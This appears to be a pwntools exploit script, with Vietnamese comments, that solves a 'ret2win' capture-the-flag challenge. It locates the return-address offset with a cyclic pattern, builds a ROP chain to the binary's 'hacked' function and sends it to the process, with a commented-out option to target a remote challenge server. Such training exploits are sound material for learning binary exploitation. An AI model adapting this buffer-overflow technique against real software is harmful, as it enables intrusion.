from pwn import *

exe = "./../challenge/src/ret2win" # Thay nó bằng đường dẫn tới file ret2win
elf = context.binary = ELF(exe, checksec=False)

def find_eip_offset(payload):
   p = process(exe)
   p.sendlineafter(b"name:\n",payload)
   p.wait()
   return cyclic_find(p.corefile.eip)

r = process(exe)

# Bỏ comment dòng dưới nếu muốn chạy trên server, đổi địa chỉ IP và port tương ứng
# r = remote("3.84.227.92", 1340)

offset = find_eip_offset(cyclic(100))

hackedAdd = elf.symbols.hacked

rop = ROP(elf)
rop.hacked()
payload = flat({
   offset: rop.chain()
})

write('payload', payload)

r.sendlineafter(b"name:\n", payload)
r.interactive()